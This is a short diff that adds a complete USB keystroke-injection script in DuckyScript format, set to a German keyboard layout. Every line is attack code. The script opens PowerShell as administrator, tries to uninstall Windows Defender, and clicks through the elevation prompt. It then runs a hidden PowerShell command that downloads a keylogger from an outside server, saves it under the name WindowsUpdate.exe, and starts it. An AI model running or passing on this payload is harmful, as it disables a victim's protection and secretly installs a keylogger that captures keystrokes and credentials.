@@ -1,0 +1,24 @@
+DELAY 2000
+LOCALE DE
+
+REM Open PowerShell as Administrator and disable Windows Defender
+DELAY 1000
+GUI r
+DELAY 800
+STRING PowerShell "Uninstall-WindowsFeature -Name Windows-Defender"
+CTRL SHIFT ENTER
+DELAY 800
+LEFT
+DELAY 100
+ENTER
+
+REM download and start keylogger
+DELAY 1000
+GUI r 
+DELAY 800
+STRING PowerShell.exe "PowerShell.exe -windowstyle hidden {$thePath = 'c:\Users\'+$env:UserName+'\WindowsUpdate.exe'; Invoke-WebRequest -Uri 'https://schmitz-server.de/Downloads/Keylogger.exe' -OutFile $thePath; Start-Process $thePath}"
+CTRL SHIFT ENTER
+DELAY 800
+LEFT
+DELAY 100
+ENTER
